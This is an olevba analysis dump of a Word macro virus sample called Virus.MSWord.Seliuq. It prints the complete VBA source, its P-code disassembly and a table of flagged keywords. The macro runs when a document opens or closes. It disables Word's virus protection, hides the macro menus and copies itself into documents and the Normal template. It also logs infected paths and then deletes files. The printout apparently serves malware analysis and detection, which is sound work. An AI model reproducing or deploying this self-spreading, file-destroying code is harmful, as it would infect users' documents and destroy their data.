olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Seliuq
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Aquiles.cls 
in file: ./Virus.MSWord.Seliuq - OLE stream: 'Macros/VBA/Aquiles'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_Open()
 On Error Resume Next
 If ActiveDocument.VBProject.VBComponents.Count > 1 Then
 For op = 2 To ActiveDocument.VBProject.VBComponents.Count
   cantidad = ActiveDocument.VBProject.VBComponents.Item(op).CodeModule.CountOfLines
   ActiveDocument.VBProject.VBComponents.Item(op).CodeModule.DeleteLines 1, cantidad
 Next op
 End If
 If NormalTemplate.VBProject.VBComponents.Count > 1 Then
 For op = 2 To NormalTemplate.VBProject.VBComponents.Count
   cantidad = NormalTemplate.VBProject.VBComponents.Item(op).CodeModule.CountOfLines
   NormalTemplate.VBProject.VBComponents.Item(op).CodeModule.DeleteLines 1, cantidad
 Next op
 End If
 Document_Close
End Sub
Private Sub Document_Close()
 On Error Resume Next
 CommandBars("Visual Basic").Visible = False
 Options.VirusProtection = False
 CommandBars("Tools").Controls("Macro").Enabled = False
 CommandBars("View").Controls(6).Enabled = False
 CommandBars("tools").Controls(15).Enabled = False
 Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
 Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
 If MacroContainer.FullName = ActiveDocument.FullName Then
  If nt.Name <> "Aquiles" Then GoTo ClaudioNormal
 Else
  If ad.Name <> "Aquiles" Then GoTo Aquilesdocument
 End If
GoTo Findelmundo
Aquilesdocument:
 lineas = ad.CodeModule.CountOfLines
 ad.CodeModule.DeleteLines 1, lineas
 lineas = 1
 Do While lineas <= nt.CodeModule.CountOfLines
    cadenadecodigo = nt.CodeModule.lines(lineas, 1)
    ad.CodeModule.insertlines lineas, cadenadecodigo
    lineas = lineas + 1
 Loop
 ad.Name = "Aquiles"
 Open "C:\systemDos" For Append As #1
   Print #1, ActiveDocument.Path
 Close #1
 ActiveDocument.Save
GoTo Findelmundo
ClaudioNormal:
 lineas = nt.CodeModule.CountOfLines
 nt.CodeModule.DeleteLines 1, lineas
 lineas = 1
 Do While lineas <= ad.CodeModule.CountOfLines
    cadenadecodigo = ad.CodeModule.lines(lineas, 1)
    nt.CodeModule.insertlines lineas, cadenadecodigo
    lineas = lineas + 1
 Loop
 nt.Name = "Aquiles"
 NormalTemplate.Save
Findelmundo:
If Dir("C:\systemDos", vbNormal) <> "" Then
If FileLen("C:\systemDos") > 1024 Then
  Open "C:\systemDos" For Input As #1
    Line Input #1, direccion
    Do While Not EOF(1)
      Kill (s + "\*.*")
      Line Input #1, direccion
    Loop
  Close #1
  Kill ("C:\systemDos")
End If
End If
'Al rio jactancioso, Dios le a puesto un vado. Malinke
'Y una vez mas el emperador interpuso su alma, claudIo
'esto es una modificacion, trato de llegar a la perfeccion
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Seliuq
' ===============================================================================
' Module streams:
' Macros/VBA/Aquiles - 4612 bytes
' Line #0:
' Line #1:
' Line #2:
' 	FuncDefn (Private Sub Document_Open())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #5:
' 	StartForVariable 
' 	Ld op 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #6:
' 	Ld op 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St cantidad 
' Line #7:
' 	LitDI2 0x0001 
' 	Ld cantidad 
' 	Ld op 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #8:
' 	StartForVariable 
' 	Ld op 
' 	EndForVariable 
' 	NextVar 
' Line #9:
' 	EndIfBlock 
' Line #10:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #11:
' 	StartForVariable 
' 	Ld op 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #12:
' 	Ld op 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St cantidad 
' Line #13:
' 	LitDI2 0x0001 
' 	Ld cantidad 
' 	Ld op 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #14:
' 	StartForVariable 
' 	Ld op 
' 	EndForVariable 
' 	NextVar 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	ArgsCall Document_Close 0x0000 
' Line #17:
' 	EndSub 
' Line #18:
' 	FuncDefn (Private Sub Document_Close())
' Line #19:
' 	OnError (Resume Next) 
' Line #20:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #22:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #23:
' 	LitVarSpecial (False)
' 	LitDI2 0x0006 
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #24:
' 	LitVarSpecial (False)
' 	LitDI2 0x000F 
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #25:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #26:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #27:
' 	Ld MacroContainer 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Eq 
' 	IfBlock 
' Line #28:
' 	Ld nt 
' 	MemLd New 
' 	LitStr 0x0007 "Aquiles"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo ClaudioNormal 
' 	EndIf 
' Line #29:
' 	ElseBlock 
' Line #30:
' 	Ld ad 
' 	MemLd New 
' 	LitStr 0x0007 "Aquiles"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo Aquilesdocument 
' 	EndIf 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	GoTo Findelmundo 
' Line #33:
' 	Label Aquilesdocument 
' Line #34:
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St lineas 
' Line #35:
' 	LitDI2 0x0001 
' 	Ld lineas 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #36:
' 	LitDI2 0x0001 
' 	St lineas 
' Line #37:
' 	Ld lineas 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Le 
' 	DoWhile 
' Line #38:
' 	Ld lineas 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St cadenadecodigo 
' Line #39:
' 	Ld lineas 
' 	Ld cadenadecodigo 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #40:
' 	Ld lineas 
' 	LitDI2 0x0001 
' 	Add 
' 	St lineas 
' Line #41:
' 	Loop 
' Line #42:
' 	LitStr 0x0007 "Aquiles"
' 	Ld ad 
' 	MemSt New 
' Line #43:
' 	LitStr 0x000C "C:\systemDos"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	PrintItemNL 
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #46:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #47:
' 	GoTo Findelmundo 
' Line #48:
' 	Label ClaudioNormal 
' Line #49:
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St lineas 
' Line #50:
' 	LitDI2 0x0001 
' 	Ld lineas 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #51:
' 	LitDI2 0x0001 
' 	St lineas 
' Line #52:
' 	Ld lineas 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Le 
' 	DoWhile 
' Line #53:
' 	Ld lineas 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St cadenadecodigo 
' Line #54:
' 	Ld lineas 
' 	Ld cadenadecodigo 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #55:
' 	Ld lineas 
' 	LitDI2 0x0001 
' 	Add 
' 	St lineas 
' Line #56:
' 	Loop 
' Line #57:
' 	LitStr 0x0007 "Aquiles"
' 	Ld nt 
' 	MemSt New 
' Line #58:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #59:
' 	Label Findelmundo 
' Line #60:
' 	LitStr 0x000C "C:\systemDos"
' 	Ld vbNormal 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #61:
' 	LitStr 0x000C "C:\systemDos"
' 	ArgsLd FileLen 0x0001 
' 	LitDI2 0x0400 
' 	Gt 
' 	IfBlock 
' Line #62:
' 	LitStr 0x000C "C:\systemDos"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #63:
' 	LitDI2 0x0001 
' 	Ld direccion 
' 	LineInput 
' Line #64:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #65:
' 	Ld s 
' 	LitStr 0x0004 "\*.*"
' 	Add 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #66:
' 	LitDI2 0x0001 
' 	Ld direccion 
' 	LineInput 
' Line #67:
' 	Loop 
' Line #68:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #69:
' 	LitStr 0x000C "C:\systemDos"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	QuoteRem 0x0000 0x0035 "Al rio jactancioso, Dios le a puesto un vado. Malinke"
' Line #73:
' 	QuoteRem 0x0000 0x0035 "Y una vez mas el emperador interpuso su alma, claudIo"
' Line #74:
' 	QuoteRem 0x0000 0x0039 "esto es una modificacion, trato de llegar a la perfeccion"
' Line #75:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

